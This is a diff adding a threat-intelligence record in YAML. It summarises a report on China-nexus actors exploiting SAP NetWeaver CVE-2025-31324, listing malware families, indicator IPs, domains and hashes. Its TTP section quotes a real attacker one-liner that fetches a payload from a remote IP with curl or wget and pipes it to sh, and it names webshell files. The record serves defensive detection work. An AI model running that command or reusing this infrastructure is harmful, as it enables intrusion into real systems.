@@ -1,0 +1,59 @@
+description: EclecticIQ analysts assess with high confidence that, in April 2025,
+  China-nexus nation-state APTs launched high-temp exploitation campaigns against
+  critical infrastructure networks by targeting SAP NetWeaver Visual Composer. Actors
+  leveraged CVE-2025-31324 [1], an unauthenticated file upload vulnerability that
+  enables remote code execution (RCE).
+attribution: China-nexus nation-state APTs, UNC5221, UNC5174, CL-STA-0048
+malware_families:
+- KrustyLoader
+- Sliver
+- VShell
+- Behinder/v3
+IOCs:
+- 15.204.56[.]106
+- 43.247.135[.]53
+- sentinelones[.]com
+- aaa.ki6zmfw3ps8q14rfbfczfq5qkhq8e12q.oastify.com
+- 54.77.139[.]23
+- 3.248.33[.]252
+- applr-malbbal.s3.ap-northeast-2.amazonaws[.]com
+- abode-dashboard-media.s3.ap-south-1.amazonaws[.]com
+- brandnav-cms-storage.s3.amazonaws[.]com
+- 103.30.76[.]206
+- 4c9e60cc73e87da4cadc51523690d67549de4902e880974bfacf7f1a8dc40d7d
+- 63aa0c6890ec5c16b872fb6d070556447cd707dfba185d32a2c10c008dbdbcdd
+TTPs:
+  processes:
+  - curl
+  - wget
+  - /bin/bash
+  - python
+  - sap.com/devserver_metadataupload_ear
+  commandline:
+  - curl -fsSL -m180 http://103.30.76.206:443/slt || wget -T180 -q http://103.30.76.206:443/slt|sh
+  - ping -c 1 aaa.ki6zmfw3ps8q14rfbfczfq5qkhq8e12q.oastify.com
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: curl
+    destination: 103.30.76[.]206:443
+  - executable: wget
+    destination: 103.30.76[.]206:443
+  file_activity:
+  - /developmentserver/metadatauploader
+  - CVE-2025-31324-results.txt
+  - _20250427_212229.txt
+  - coreasp.js
+  - forwardsap.jsp
+  persistence:
+  - Webshells deployed after post-exploitation to maintain persistence remote access
+    into victim SAP systems.
+  pipes: ''
+  process_relations: ''
+authors:
+- EclecticIQ analysts
+reference: https://blog.eclecticiq.com/china-nexus-nation-state-actors-exploit-sap-netweaver-cve-2025-31324-to-target-critical-infrastructures
+date_of_publication: May 13, 2025
+file_creation_date: May 28, 2025
